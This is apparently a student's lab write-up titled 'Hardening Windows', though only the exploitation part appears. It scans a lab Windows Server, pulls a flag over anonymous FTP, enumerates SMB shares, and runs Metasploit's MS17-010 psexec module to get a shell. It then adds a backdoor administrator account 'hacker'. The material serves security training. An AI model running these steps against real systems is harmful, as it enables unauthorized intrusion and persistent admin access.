# Hardening Windows

In this lab I will successfully exploit and harden a Windows Server using Nmap and Metasploit. 

Exploitation 

1. Boot and run your Kali Linux Virtual Machine. 

2. Click and open the terminal.

3. Once the terminal is opened, we are going to find our IP address. To do so, type in the following command: ifconfig eth0

<img width="357" alt="image" src="https://github.com/user-attachments/assets/188a5f0d-e42f-45aa-9d93-2e8585e3d862" />

Result of step 3

4. Next we are going to ping the Windows Server.

Type in the following command: ping 192.168.1.100 -c 4

<img width="394" alt="image" src="https://github.com/user-attachments/assets/d25d9e55-3329-4d56-93b2-c252828ee742" />

Result of step 4

5. Now we are going to scan the Windows Server.

Type in the following command: ping 192.168.1.100

<img width="398" alt="image" src="https://github.com/user-attachments/assets/19f9086d-6f15-49aa-88dc-0adff8401308" />

Result of step 5. To exit the scan click Ctrl+Z.

6. We are going to create a fake mp3 file.

Type in the following command: echo this is not a real mp3 file > 8675309.mp3

7. Type the following command to connect to the ftp server: ftp 192.168.1.100

After connecting, log in as the Name ftp for example. For the password, type "ftp" for password or you can just press Enter (*note I am typing ftp). Any credentials will be accepted if anonymous access is allowed.

![image](https://github.com/user-attachments/assets/483fe019-a976-469c-97ed-012ab1481430)

Result of step 7

8. Now type the following commands in the FTP prompt.

ftp>ls

ftp> get flag.txt

ftp> put 8675309.mp3

ftp> bye

![image](https://github.com/user-attachments/assets/e14fb246-8912-40a1-b58d-87c9510b52c1)

Result of step 8

9. To view the flag.

Type in the following command: cat flag.txt

10. We are going to scan the Windows Server.

Type in the following command: nmap 192.168.1.100

<img width="404" alt="image" src="https://github.com/user-attachments/assets/09c74d49-6fa6-488e-8e51-dbb6bbe49ac7" />

Result of step 10

11. We also see that HTTP is open by the list of other ports. Most people use HTTPS now. We will now test to see if the website is functioning for company purposes or has not been setup. Next we are going to pull up the Web Browser.

12. Minimize the cmd prompt. Click the Windows Key on the toolbar on the bottom of the screen. Click the Web Broswer icon once the start menu opens.

<img width="275" alt="image" src="https://github.com/user-attachments/assets/4a096437-a331-437b-bf8d-674c1c5fbdc1" />

Result of step 12

13. In the URL bar, type in http://192.168.1.100 or 192.168.1.100

<img width="477" alt="image" src="https://github.com/user-attachments/assets/a780e1cd-306a-4c66-844e-be9bc648e094" />

Result of step 13

14. Now close the browser. Open the terminal up again.

Type in the following command: nmap 192.168.1.100

<img width="397" alt="image" src="https://github.com/user-attachments/assets/1bb80cd2-adba-4e2e-aeec-0c3d7c53f97e" />

Result of step 14

15. We also see that File and Print Sharing is open by the list of other ports.

Type the following command to enumerate the shares: smbclient -L \\192.168.1.100

![image](https://github.com/user-attachments/assets/71547a3d-3f30-445a-8ebb-8cee789a19fa)

Press enter after the prompt of entering a password is asked.

16. Follow step 12 again.

17. Type in the URL bar: https://www.google.com and search up smb exploit windows server 2016. 

<img width="478" alt="image" src="https://github.com/user-attachments/assets/d9f98403-8db3-4d51-bf10-0910e11ef727" />

Result of step 17

18. Close the browser again. We are going to initialize the database for Metasploit.

Type in the following command: msfdb init

<img width="465" alt="image" src="https://github.com/user-attachments/assets/a82d8676-e2b3-4406-872c-826045669efb" />

Result of step 18

19. Type in the following command: msfconsole

<img width="386" alt="image" src="https://github.com/user-attachments/assets/5fcdf254-5284-4853-b2e7-ed6e93139cdf" />

Result of step 19

20. Type in the following command in the msf5 search: search MS17-010.

![image](https://github.com/user-attachments/assets/760b806b-67aa-481c-851a-31ba59108cd5)

Result of step 20

21. Type in the following command in the msf5 search: use exploit/windows/smb/ms17_010_psexec

<img width="286" alt="image" src="https://github.com/user-attachments/assets/4e08b804-f7e9-424d-bd94-e3898ca44e37" />

Result of step 21

22. Type in the following command in the msf5 search: info

<img width="461" alt="image" src="https://github.com/user-attachments/assets/07b600e7-41fe-493e-93bd-c00e1fd7315c" />

Result of step 22

23. The next step will be critical to our remediation later. Scroll down to the bottom of the info and right-click the first reference and select Open Link.​

<img width="425" alt="image" src="https://github.com/user-attachments/assets/c6b317a4-10b5-47f5-a072-c33753ed5fc5" />

Result of step 23

24. Now we are going to set the remote host to 192.168.1.100

Type in the following command in the msf5 search: set RHOSTS 192.168.1.100

<img width="434" alt="image" src="https://github.com/user-attachments/assets/2967cf1c-39ef-468c-a0c9-0e12401ee9c5" />

Result of step 24

25. Now we are going to check the system is vulnerable.

Type in the following command in the msf5 search: check

<img width="461" alt="image" src="https://github.com/user-attachments/assets/f1d64841-5005-496d-8675-52c8e3ecb880" />

Result of step 25

26. Now we are going to exploit the system.

Type in the following command in the msf5 search: exploit

<img width="463" alt="image" src="https://github.com/user-attachments/assets/56c63dde-3d9f-4343-bb6b-5d1b8e169c6a" />

Result of step 26

27. With this, we are brought to the meterpreter.

Type in the following command in the meterpreter prompt: shell

<img width="327" alt="image" src="https://github.com/user-attachments/assets/397af922-9931-4416-a1f5-a61f9f283bc6" />

Result of step 27

28. To add an account.

Type in the following command into the system32 prompt: net user hacker P@ssw0rd /add

<img width="317" alt="image" src="https://github.com/user-attachments/assets/a324bcde-f414-44cf-9d20-ba74ba8668f7" />

Result of step 28

29. To add an account to the administrators group.

Type in the following command into the system32 prompt: net localgroup administrators hacker /add

<img width="386" alt="image" src="https://github.com/user-attachments/assets/195cba5f-3928-4b22-9f67-5af463e69570" />

Result of step 29

30. Type in the following command to exit twice to remove the connection to the command prompt and the victim: exit

<img width="431" alt="image" src="https://github.com/user-attachments/assets/85adf8c4-0893-4d45-a70f-28755d4fc0dd" />

Result of step 30
